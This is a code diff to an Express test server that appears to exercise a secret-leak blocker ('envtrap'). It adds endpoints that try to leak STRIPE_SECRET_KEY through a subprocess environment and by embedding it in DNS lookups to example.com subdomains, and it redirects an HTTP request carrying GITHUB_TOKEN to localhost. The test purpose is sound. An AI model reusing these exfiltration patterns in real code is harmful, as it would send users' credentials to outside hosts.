@@ -2,6 +2,10 @@ import express from "express";
 import { execSync } from "child_process";
 import http from "http";
 import dotenv from "dotenv";
+import dns from "dns";
+import { createRequire } from "module";
+
+const require = createRequire(import.meta.url);
 
 dotenv.config();
 
@@ -41,10 +45,10 @@ app.get("/leak-http", (req, res) => {
   console.log("=== EXPLICIT ATTEMPT TO SEND SECRET VIA HTTP ===");
   
   const requestOptions = {
-    hostname: "httpbin.org",
-    port: 80,
-    path: "/post",
-    method: "POST",
+    hostname: "localhost",
+    port: PORT,
+    path: "/",
+    method: "GET",
     headers: {
       "Content-Type": "application/json",
       "Authorization": `Bearer ${process.env.GITHUB_TOKEN}`
@@ -57,7 +61,7 @@ app.get("/leak-http", (req, res) => {
     response.on("end", () => {
       res.json({
         status: "HTTP request completed successfully (envtrap did not block it).",
-        responseData: JSON.parse(responseData)
+        responseData: responseData
       });
     });
   });
@@ -78,7 +82,7 @@ app.get("/leak-http", (req, res) => {
   request.end();
 });
 
-// 4. Subprocess Execution Leak
+// 4. Subprocess Execution Leak (ESM)
 app.get("/leak-subprocess", (req, res) => {
   console.log("=== EXPLICIT ATTEMPT TO SPAWN FORBIDDEN SUBPROCESS ===");
   try {
@@ -106,7 +110,64 @@ app.get("/leak-subprocess", (req, res) => {
   }
 });
 
-// 5. Clean Shutdown Endpoint
+// 5. Subprocess Execution Leak (CommonJS require)
+app.get("/leak-subprocess-cjs", (req, res) => {
+  const cp = require("child_process");
+  try {
+    const output = cp.execSync("echo \"CJS Subprocess\"", {
+      env: { STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY },
+      encoding: "utf8"
+    });
+    res.json({
+      status: "Subprocess execution completed.",
+      output: output.trim()
+    });
+  } catch (error) {
+    res.status(500).json({
+      status: "Subprocess execution was blocked!",
+      error: error.message
+    });
+  }
+});
+
+// 6. DNS Leak (ESM)
+app.get("/leak-dns-esm", (req, res) => {
+  try {
+    dns.lookup(`prefix.${process.env.STRIPE_SECRET_KEY}.example.com`, (err) => {
+      if (err && err.code !== "ENOTFOUND" && err.code !== "EAI_AGAIN") {
+        res.status(500).json({ error: err.message });
+      } else {
+        res.json({ status: "Success" });
+      }
+    });
+  } catch (error) {
+    res.status(500).json({
+      status: "DNS resolution blocked / failed!",
+      error: error.message
+    });
+  }
+});
+
+// 7. DNS Leak (CommonJS require)
+app.get("/leak-dns-cjs", (req, res) => {
+  const dnsCjs = require("dns");
+  try {
+    dnsCjs.lookup(`prefix.${process.env.STRIPE_SECRET_KEY}.example.com`, (err) => {
+      if (err && err.code !== "ENOTFOUND" && err.code !== "EAI_AGAIN") {
+        res.status(500).json({ error: err.message });
+      } else {
+        res.json({ status: "Success" });
+      }
+    });
+  } catch (error) {
+    res.status(500).json({
+      status: "DNS resolution blocked / failed!",
+      error: error.message
+    });
+  }
+});
+
+// 8. Clean Shutdown Endpoint
 app.get("/shutdown", (req, res) => {
   res.json({ status: "Shutting down..." });
   // Allow response to send before exiting
